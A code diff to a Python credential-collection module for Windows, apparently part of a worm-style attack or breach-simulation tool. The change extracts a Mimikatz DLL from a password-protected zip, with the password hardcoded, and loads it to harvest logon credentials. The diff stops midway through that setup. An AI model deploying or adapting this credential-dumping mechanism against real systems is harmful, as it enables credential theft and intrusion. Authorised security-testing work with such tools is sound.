@@ -2,6 +2,9 @@ import binascii
 import ctypes
 import logging
 import socket
+import zipfile
+
+from pyinstaller_utils import get_binary_file_path, get_binaries_dir_path
 
 __author__ = 'itay.mizeretz'
 
@@ -13,12 +16,30 @@ class MimikatzCollector(object):
     Password collection module for Windows using Mimikatz.
     """
 
-    def __init__(self):
-        try:
+    # Name of Mimikatz DLL. Must be name of file in Mimikatz zip.
+    MIMIKATZ_DLL_NAME = 'tmpzipfile123456.dll'
 
-            self._isInit = False
-            self._config = __import__('config').WormConfiguration
-            self._dll = ctypes.WinDLL(self._config.mimikatz_dll_name)
+    # Name of ZIP containing Mimikatz. Must be identical to one on monkey.spec
+    MIMIKATZ_ZIP_NAME = 'tmpzipfile123456.zip'
+
+    # Password to Mimikatz zip file
+    MIMIKATZ_ZIP_PASSWORD = r'VTQpsJPXgZuXhX6x3V84G'
+
+    def __init__(self):
+        self._config = __import__('config').WormConfiguration
+        self._isInit = False
+        self._dll = None
+        self._collect = None
+        self._get = None
+        self.init_mimikatz()
+
+    def init_mimikatz(self):
+        try:
+            with zipfile.ZipFile(get_binary_file_path(MimikatzCollector.MIMIKATZ_ZIP_NAME), 'r') as mimikatz_zip:
+                mimikatz_zip.extract(self.MIMIKATZ_DLL_NAME, path=get_binaries_dir_path(),
+                                     pwd=self.MIMIKATZ_ZIP_PASSWORD)
+
+            self._dll = ctypes.WinDLL(get_binary_file_path(self.MIMIKATZ_DLL_NAME))
             collect_proto = ctypes.WINFUNCTYPE(ctypes.c_int)
             get_proto = ctypes.WINFUNCTYPE(MimikatzCollector.LogonData)
             get_text_output_proto = ctypes.WINFUNCTYPE(ctypes.c_wchar_p)
